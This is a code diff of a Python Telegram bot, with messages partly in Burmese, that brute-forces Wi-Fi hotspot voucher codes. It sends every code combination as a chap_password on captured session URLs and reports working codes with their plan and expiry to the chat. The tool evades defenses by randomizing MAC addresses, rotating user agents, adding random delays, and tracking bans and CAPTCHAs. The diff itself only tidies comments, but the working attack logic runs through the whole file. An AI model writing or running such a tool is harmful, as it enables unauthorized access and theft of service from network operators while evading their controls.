@@ -1,6 +1,5 @@
 import os
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-
+import asyncio
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 import requests
@@ -11,13 +10,14 @@ import random
 import re
 import json
 
+BOT_TOKEN = os.getenv("BOT_TOKEN")
 
 sessions = []
 scanning_active = False
 start_time = time.time()
 attempts_since_last = 0
 last_progress_time = time.time()
-ban_count = 0  # Ban counter
+ban_count = 0
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
@@ -68,7 +68,7 @@ async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
     start_time = time.time()
     attempts_since_last = 0
     last_progress_time = time.time()
-    ban_count = 0  # Ban counter ကို ပြန်သတ်မှတ်ပါ
+    ban_count = 0
     await update.message.reply_text(f"🚀 Scan စတင်ပြီ။ စာလုံးအရေအတွက်: {length}။ (နှေးနှေးသွားမယ်)")
     thread = threading.Thread(target=bruteforce_worker, args=(update, context, length))
     thread.start()
@@ -89,28 +89,22 @@ def bruteforce_worker(update, context, length):
             code = ''.join(combo)
             total_attempts += 1
             attempts_since_last += 1
-            
             for session_url in sessions:
                 new_mac = random_mac()
                 test_url = session_url.replace("mac=44:71:47:44:35:05", f"mac={new_mac}")
                 test_url = f"{test_url}&chap_password={code}"
-                
                 headers = {
                     "User-Agent": random.choice(USER_AGENTS),
                     "Accept": "application/json, text/plain, */*",
                     "Accept-Language": "en-US,en;q=0.5",
                     "Connection": "keep-alive",
                 }
-                
                 try:
                     response = requests.get(test_url, timeout=5, headers=headers)
-                    
-                    # Ban detection
                     if response.status_code == 403 or response.status_code == 429:
                         ban_count += 1
                     elif response.status_code == 200 and "success" in response.text.lower():
                         found_codes.append(code)
-                        
                         plan = "Unknown"
                         time_plan = "Unknown"
                         try:
@@ -125,7 +119,6 @@ def bruteforce_worker(update, context, length):
                             time_match = re.search(r'(?:time|expire|expiry)["\']?\s*[:=]\s*["\']?([^"\'}\s,]+)', text, re.IGNORECASE)
                             if time_match:
                                 time_plan = time_match.group(1)
-                        
                         context.bot.send_message(
                             chat_id=update.effective_chat.id,
                             text=f"✅ အောင်မြင်တဲ့ code တွေ့ပြီ: {code}\n"
@@ -133,28 +126,21 @@ def bruteforce_worker(update, context, length):
                                  f"⏳ Time: {time_plan}\n"
                                  f"🔗 Session URL: {session_url}"
                         )
-                    # CAPTCHA detection (ပုံထဲက "Captcha" ကို simulate လုပ်ထားတယ်)
                     elif "captcha" in response.text.lower() or response.status_code == 418:
                         captcha_count += 1
                 except:
                     pass
-                
                 time.sleep(random.uniform(0.5, 1.5))
-            
-            # Progress ကို ၁၀၀ ကြိမ်တိုင်း ပြတယ်
             if total_attempts % 100 == 0:
                 elapsed = time.time() - start_time
                 if elapsed > 0:
                     speed = int((total_attempts / elapsed) * 60)
                 else:
                     speed = 0
-                
                 progress = (total_attempts / total_possible) * 100
                 if progress > 100:
                     progress = 100
-                
                 bar = progress_bar(progress)
-                
                 context.bot.send_message(
                     chat_id=update.effective_chat.id,
                     text=f"🔍 Scanning Codes...\n"
@@ -167,7 +153,6 @@ def bruteforce_worker(update, context, length):
                          f"🧩 Captcha : {captcha_count:,}\n"
                          f"{bar}"
                 )
-            
             if not scanning_active:
                 break
     scanning_active = False
